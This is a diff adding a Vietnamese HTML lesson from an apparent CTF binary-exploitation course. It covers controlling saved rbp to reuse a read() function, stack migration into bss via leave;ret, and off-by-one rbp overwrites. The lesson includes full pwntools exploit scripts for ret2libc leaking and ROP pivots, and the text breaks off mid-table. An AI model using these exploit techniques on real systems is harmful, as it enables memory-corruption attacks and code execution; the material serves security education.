@@ -1,0 +1,478 @@
+<title>Function Reuse via rbp</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(26px,5.5vw,42px);line-height:1.04;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.frame{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.fr{display:grid;grid-template-columns:130px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.fr .o{color:var(--mem);white-space:nowrap}
+.fr.key{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.ropmap{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.rr{display:grid;grid-template-columns:150px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:7px 10px;background:var(--surface-2)}
+.rr .a{color:var(--mem);white-space:nowrap}
+.rr.g{background:var(--mem-soft);border-color:var(--mem)}.rr.call{background:var(--accent-soft);border-color:var(--accent)}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 2 · Bài 13</div>
+    <h1>Function Reuse via rbp</h1>
+    <p class="sub">Khi overflow chỉ cho ghi đè <strong>saved rbp + saved RIP</strong> (hoặc chỉ 1 byte rbp), nhưng binary có một hàm hữu ích (vd <code>read</code>/<code>gets</code> vào <code>[rbp-X]</code>). Kiểm soát <mark>rbp</mark> làm hàm ghi/đọc vào <strong>nơi ta chọn</strong>, và chuỗi <code>leave; ret</code> để <strong>quay lại hàm nhiều lần</strong> — "migration" dần dựng payload mà không cần nhiều gadget.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Cao (Phase 2)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 no-PIE, overflow hẹp</span>
+      <span class="chip"><b>Cần trước:</b> <a href="stack_pivot.html" style="color:inherit">stack_pivot</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~45 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 rbp điều khiển</a><a href="#s4">04 Migration</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Quan sát:</strong> nhiều hàm thao tác qua <code>rbp</code> — <code>read(0, rbp-0x40, n)</code>, <code>printf(rbp-0x40)</code>... Nếu ta kiểm soát saved rbp, hàm sẽ ghi/đọc vào <mark>địa chỉ ta chọn</mark> (rbp−0x40).</p>
+    <p><strong>Migration:</strong> ghi đè saved rbp = vùng mới + saved RIP = <code>địa chỉ hàm (bỏ prologue push rbp)</code> → hàm chạy lại với rbp mới → ghi payload vào vùng mới. Lặp để <strong>tái dùng hàm</strong> dựng dần chuỗi dài.</p>
+    <p><strong>1-byte rbp:</strong> đôi khi chỉ off-by-one ghi được 1 byte của rbp → vẫn pivot/đổi hướng được một đoạn (kết hợp brute).</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>kiểm soát rbp = kiểm soát nơi hàm đọc/ghi; leave;ret lặp để tái dùng hàm.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🚦 Dùng khi</span>
+        <p>Overflow chỉ tới saved rbp + RIP (hẹp) · có hàm thao tác qua rbp (read/gets/printf vào [rbp-X]) · muốn ghi payload vào vùng cố định (bss) hoặc quay lại hàm nhiều lần.</p></div>
+      <div class="combat-row"><span class="lab">🎯 Mẫu migration</span>
+<pre><code>payload = buf_fill + p64(NEW_BASE) + p64(func_after_prologue)
+<span class="c"># func_after_prologue = địa chỉ hàm BỎ QUA "push rbp; mov rbp,rsp"</span>
+<span class="c"># → hàm chạy với rbp = NEW_BASE → ghi vào NEW_BASE - X</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🔁 Lặp bằng leave; ret</span>
+        <p>Kết thúc mỗi vòng bằng <code>leave; ret</code> (epilogue chuẩn): rsp theo rbp đã đặt → "ret" vào payload ta vừa ghi ở vùng mới → tiếp tục chain.</p></div>
+      <div class="combat-row"><span class="lab">🧱 Ghi địa chỉ bằng read qua rbp</span>
+<pre><code><span class="c"># read(0, rbp-0x40, 0x100) với rbp=bss+0x40 → ghi 0x100 byte vào bss</span></code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Bẫy</span>
+        <p>Phải nhảy vào hàm <b>sau prologue</b> (nếu không, push rbp làm hỏng rbp ta đặt). rbp off-by-one chỉ đổi 1 byte → cần đích cùng trang/brute. Kết thúc phải leave;ret để rsp theo rbp mới.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>rbp làm "mốc" truy cập biến cục bộ</h2>
+  <p>Compiler dùng <code>rbp</code> làm mốc: biến cục bộ ở <code>[rbp-X]</code>, tham số ở <code>[rbp+X]</code>. Một hàm như <code>read(0, buf, n)</code> với <code>buf</code> cục bộ dịch thành <code>lea rdi, [rbp-0x40]; ...; call read</code>. Nếu attacker đặt <code>rbp</code> = giá trị tùy ý, hàm sẽ thao tác tại <code>rbp-0x40</code> = <strong>bất kỳ đâu</strong>. Prologue chuẩn <code>push rbp; mov rbp, rsp</code> thiết lập rbp; epilogue <code>leave (mov rsp,rbp; pop rbp); ret</code> khôi phục.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">rbp (frame pointer)</div><p>Mốc truy cập biến cục bộ [rbp-X].</p></div>
+    <div class="card"><div class="term">function reuse</div><p>Gọi lại hàm có sẵn với rbp mới.</p></div>
+    <div class="card"><div class="term">migration</div><p>Dời "stack" sang vùng mới qua rbp + leave;ret.</p></div>
+    <div class="card"><div class="term">after prologue</div><p>Địa chỉ hàm BỎ push rbp; mov rbp,rsp.</p></div>
+    <div class="card"><div class="term">off-by-one rbp</div><p>Ghi đè 1 byte thấp của saved rbp.</p></div>
+    <div class="card"><div class="term">leave; ret</div><p>Epilogue; đưa rsp theo rbp.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Khi overflow siêu hẹp</h2>
+  <p>Có đề chỉ cho ghi đè <strong>đúng saved rbp + saved RIP</strong> (16 byte), hoặc tệ hơn — off-by-one chỉ 1 byte của rbp. Không đủ cho chuỗi ROP. Nhưng chương trình thường có sẵn một hàm "ghi dữ liệu theo rbp" (read/gets). Bằng cách <em>tái dùng</em> hàm đó với rbp ta kiểm soát, ta ghi payload vào vùng cố định rồi pivot vào đó — dựng dần một khai thác đầy đủ từ một lỗ hổng tí hon. Đây là nghệ thuật "làm nhiều từ ít".</p>
+ </div>
+</section>
+
+<!-- 03 rbp -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / rbp ĐIỀU KHIỂN · MỤC LÕI</div>
+  <h2>Hàm ghi vào rbp−X (số thật)</h2>
+  <pre><code><span class="c">// hàm vuln (disasm):</span>
+push   rbp
+mov    rbp, rsp
+sub    rsp, 0x40
+lea    rdi, [rbp-0x40]     <span class="c"># buf = rbp-0x40</span>
+mov    edx, 0x100
+call   read                <span class="c"># read(0, rbp-0x40, 0x100)</span>
+leave                       <span class="c"># mov rsp,rbp; pop rbp</span>
+ret</code></pre>
+  <p>Nếu ta ghi đè saved rbp của hàm GỌI nó thành <code>bss+0x40</code>, và return vào <strong>sau prologue</strong> (địa chỉ <code>lea rdi,[rbp-0x40]</code>), thì <code>read</code> ghi 0x100 byte vào <code>bss</code> — vùng ta chọn.</p>
+  <h3>Bố cục overflow (số thật)</h3>
+  <div class="ropmap">
+    <div class="rr" style="opacity:.75"><span class="a">buffer</span><span>b"A"*0x40</span></div>
+    <div class="rr g"><span class="a">0x404140</span><span>saved rbp = bss(0x404100) + 0x40 → read ghi vào 0x404100</span></div>
+    <div class="rr call"><span class="a">0x40118a</span><span>saved RIP = vuln+sau_prologue (lea rdi,[rbp-0x40])</span></div>
+  </div>
+  <div class="note tip"><span class="tag">Sau prologue</span>Nếu return vào ĐẦU hàm (push rbp), rbp ta đặt bị <code>push</code> đè rồi <code>mov rbp,rsp</code> ghi lại — mất kiểm soát. Nên nhảy vào SAU <code>push rbp; mov rbp,rsp</code> (giữ rbp ta đặt).</div>
+ </div>
+</section>
+
+<!-- 04 Migration -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / STACK MIGRATION (lặp)</div>
+  <h2>Dời sang bss &amp; chạy chuỗi dài</h2>
+  <figure class="dg">
+  <svg viewBox="0 0 620 120" role="img" aria-label="read ghi chain vào bss qua rbp, leave;ret pivot sang bss, chạy chain dài" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <rect x="20" y="40" width="160" height="46" rx="8" stroke-width="1.5"/>
+    <text x="100" y="60" text-anchor="middle" font-size="11" fill="currentColor" stroke="none" font-family="monospace">read qua rbp</text>
+    <text x="100" y="76" text-anchor="middle" font-size="10" fill="var(--mem)" stroke="none" font-family="monospace">ghi chain vào bss</text>
+    <rect x="235" y="40" width="160" height="46" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="315" y="60" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">leave; ret</text>
+    <text x="315" y="76" text-anchor="middle" font-size="10" fill="#e8663e" stroke="none" font-family="monospace">rsp ← bss (rbp)</text>
+    <rect x="460" y="40" width="140" height="46" rx="8" stroke-width="1.6" stroke="#e8663e"/>
+    <text x="530" y="64" text-anchor="middle" font-size="11" fill="#e8663e" stroke="none" font-family="monospace">chain dài chạy</text>
+    <line x1="180" y1="63" x2="233" y2="63" stroke-width="1.4"/>
+    <line x1="395" y1="63" x2="458" y2="63" stroke="#e8663e" stroke-width="1.5"/>
+    <text x="310" y="108" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.72">Dùng hàm read (qua rbp) ghi chain vào bss; leave;ret pivot vào bss → chạy chain dài.</text>
+  </svg>
+  <figcaption>Migration = tái dùng read để nạp chain vào bss, rồi pivot.</figcaption>
+  </figure>
+  <h3>2 bước migration</h3>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Nạp chain vào bss</h4><p>rbp=bss+0x40, return vào read-sau-prologue → read ghi chain (ret2libc/execve) vào bss. Kết thúc hàm bằng leave;ret.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Pivot &amp; chạy</h4><p>leave: rsp=rbp(bss+0x40); pop rbp; ret → nhảy vào chain tại bss → chạy chuỗi dài.</p></div></div>
+  <div class="note warn"><span class="tag">Sắp xếp bss</span>Cần tính kỹ offset: read ghi tại <code>rbp−0x40</code>, nhưng leave đặt rsp=<code>rbp</code> rồi pop (rsp+8). Căn để chain[0] rơi đúng rsp sau leave. Dựng &amp; kiểm bằng gdb từng bước.</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>rbp điều khiển nơi read ghi</h2>
+  <p>Nhập giá trị rbp → xem read(rbp−0x40) ghi vào đâu, và sau leave;ret thì rsp ở đâu.</p>
+  <div class="lab">
+    <div style="background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;font-family:var(--font-mono);font-size:13px">
+      <label style="font-size:12px;color:var(--muted);display:block;margin-bottom:4px">saved rbp bạn đặt:</label>
+      <input id="rbpIn" value="0x404140" style="font-family:var(--font-mono);font-size:14px;padding:7px 10px;border:1px solid var(--line);border-radius:7px;background:var(--surface);color:var(--fg);width:200px">
+      <div id="out" style="margin-top:12px;display:flex;flex-direction:column;gap:6px"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Hàm qua rbp &amp; địa chỉ sau prologue</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Tìm hàm thao tác qua rbp</h4>
+    <pre><code><span class="c"># objdump/IDA: lea rdi,[rbp-X]; call read/gets/printf</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Địa chỉ sau prologue</h4>
+    <pre><code><span class="c"># bỏ qua "push rbp; mov rbp,rsp" (thường +0x4 so với đầu hàm)</span>
+<span class="p">&gt;&gt;&gt;</span> vuln_after = exe.sym.vuln + <span class="d">4</span>   <span class="c"># hoặc địa chỉ lea rdi</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>bss &amp; offset</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> bss = exe.bss(<span class="d">0x400</span>)   <span class="c"># vùng ghi chain</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>Migration: read→bss→pivot→ret2libc</h2>
+  <pre><code><span class="c">// vuln.c — hàm read(0, buf[0x40], 0x100) kết thúc leave;ret; overflow hẹp</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · migration</button>
+    <button class="tab" data-t="b">B · off-by-one rbp</button>
+    <button class="tab" data-t="c">C · pwntools</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — tái dùng read để nạp chain vào bss, leave;ret pivot. Số thật.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+vuln_after = exe.sym.vuln + <span class="d">4</span>      <span class="c"># sau push rbp; mov rbp,rsp</span>
+leave_ret  = <span class="d">0x40117c</span>
+bss        = exe.bss(<span class="d">0x400</span>)          <span class="c"># 0x404100</span>
+pop_rdi    = <span class="d">0x401263</span>
+
+<span class="c"># chain ret2libc (leak) sẽ nằm ở bss:</span>
+chain = flat(pop_rdi, exe.got.puts, exe.plt.puts, exe.sym.main)
+
+<span class="c"># GIAI ĐOẠN 1: ghi đè rbp=bss+0x40, RIP=vuln_after → read ghi chain vào bss.</span>
+<span class="c"># hàm kết thúc leave;ret → pivot vào bss.</span>
+pay  = b<span class="s">"A"</span>*<span class="d">0x40</span>
+pay += p64(bss + <span class="d">0x40</span>)              <span class="c"># saved rbp → read ghi vào bss</span>
+pay += p64(vuln_after)                <span class="c"># chạy lại read với rbp mới</span>
+p.send(pay)
+
+<span class="c"># read lần này nhận 'chain' → ghi vào bss ; sau đó leave;ret pivot vào bss</span>
+p.send(chain.ljust(<span class="d">0x100</span>, b<span class="s">"\x00"</span>))
+<span class="c"># → chain chạy: leak puts → rebase → quay main → giai đoạn 2 system</span>
+leak = u64(p.recvline().strip().ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>))
+libc.address = leak - libc.sym.puts
+<span class="c"># ... giai đoạn 2: ret2libc như bài ret2libc ...</span>
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Số <code>vuln_after=sym.vuln+4</code>, <code>leave_ret</code>, <code>bss</code> &amp; cách leave;ret pivot phụ thuộc disasm đề. Căn offset chain trong bss cho đúng rsp sau leave — dựng &amp; kiểm từng bước bằng gdb. Đây là "migration" kinh điển.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — off-by-one: chỉ ghi được 1 byte thấp của saved rbp.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+<span class="c"># saved rbp đổi 1 byte → trỏ về trong CÙNG buffer (cùng trang) nơi ta kiểm soát.</span>
+<span class="c"># ghi payload giả vào buffer tại offset đó; leave;ret sẽ pivot vào đấy.</span>
+pay = b<span class="s">"B"</span>*<span class="d">8</span> + fake_chain          <span class="c"># fake_chain tại vị trí byte-thấp trỏ tới</span>
+pay = pay.ljust(<span class="d">0x40</span>, b<span class="s">"A"</span>)
+pay += p8(<span class="d">0x00</span>)                        <span class="c"># ghi 1 byte thấp rbp = 0x..00 (căn)</span>
+p.send(pay)
+<span class="c"># có thể cần brute vì byte thứ 2 ngẫu nhiên (xem partial_overwrite)</span>
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">off-by-one</span>Khi chỉ đổi 1 byte rbp: trỏ nó về trong chính buffer (cùng trang) nơi ta đã đặt một "fake frame". Nếu byte thứ 2 ngẫu nhiên → brute 1/16 (xem <a href="partial_overwrite.html">partial_overwrite</a>).</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwntools dựng chain, migration thủ công.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); p = process(exe.path)
+bss = exe.bss(<span class="d">0x400</span>); vuln_after = exe.sym.vuln + <span class="d">4</span>
+r = ROP(exe); r.call(exe.plt.puts, [exe.got.puts]); r.call(exe.sym.main)
+p.send(b<span class="s">"A"</span>*<span class="d">0x40</span> + p64(bss+<span class="d">0x40</span>) + p64(vuln_after))
+p.send(r.chain().ljust(<span class="d">0x100</span>, b<span class="s">"\x00"</span>))
+<span class="c"># ... leak, rebase, giai đoạn 2 ...</span>
+p.interactive()</code></pre>
+<div class="note"><span class="tag">pwntools</span>ROP lo chuỗi; phần migration (rbp + vuln_after + leave;ret) tự dựng. Hiểu rbp để căn offset.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>rbp bị prologue đè</h4><p>Return vào SAU push rbp; mov rbp,rsp.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Chain lệch sau leave</h4><p>Căn offset chain trong bss cho đúng rsp sau leave;ret.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>off-by-one byte 2 random</h4><p>Brute 1/16 hoặc chọn đích cùng nibble.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">objdump / IDA 9.1 Pro</div><h4>Tìm hàm qua rbp</h4><p>lea rdi,[rbp-X]; sau prologue.</p></div>
+    <div class="card"><div class="term">gdb</div><h4>Theo dõi rbp/rsp</h4><p>Break tại leave, read.</p></div>
+    <div class="card"><div class="term">pwntools fit/flat</div><h4>Dựng payload</h4><p>Căn offset bss.</p></div>
+    <div class="card"><div class="term">cyclic</div><h4>Offset rbp/RIP</h4><p>Xác định vị trí.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi migration không chạy</h2>
+  <div class="grid">
+    <div class="card"><h4>rbp bị đè</h4><p>Return đầu hàm → prologue phá rbp. Vào sau prologue.</p></div>
+    <div class="card"><h4>read ghi sai chỗ</h4><p>rbp−X ≠ đích. Kiểm offset X trong disasm.</p></div>
+    <div class="card"><h4>Chain lệch</h4><p>leave đặt rsp=rbp rồi pop. Căn chain trong bss.</p></div>
+    <div class="card"><h4>bss không ghi được</h4><p>Dùng .data hoặc vùng khác ghi được.</p></div>
+    <div class="card"><h4>off-by-one không đủ</h4><p>1 byte không tới đích. Cần đích cùng trang + brute.</p></div>
+    <div class="card"><h4>PIE</h4><p>Địa chỉ random. Leak trước; migration phức tạp hơn.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ</div>
+  <h2>Quan hệ với stack pivot &amp; partial</h2>
+  <div class="tablewrap"><table>
